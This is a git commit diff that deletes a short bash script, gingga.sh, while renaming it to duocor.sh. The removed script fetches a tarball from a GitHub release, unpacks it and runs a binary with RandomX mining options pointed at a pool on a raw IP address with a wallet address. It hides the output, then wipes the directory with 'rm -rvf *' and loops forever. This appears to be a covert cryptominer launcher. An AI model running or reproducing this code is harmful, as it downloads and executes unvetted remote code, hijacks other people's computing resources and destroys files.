a0d4fa40528ccfdf952c2acf5cc5b794a74d83ba
kolorijo01 <163302691+kolorijo01@users.noreply.github.com>
2024-03-30 00:17:15 +0700

    Update and rename gingga.sh to duocor.sh

--- gingga.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto" -t 1 >/dev/null 2>&1 
-rm -rvf *
-while true
-do
-        echo "gass boss..."
-        sleep 60
-done
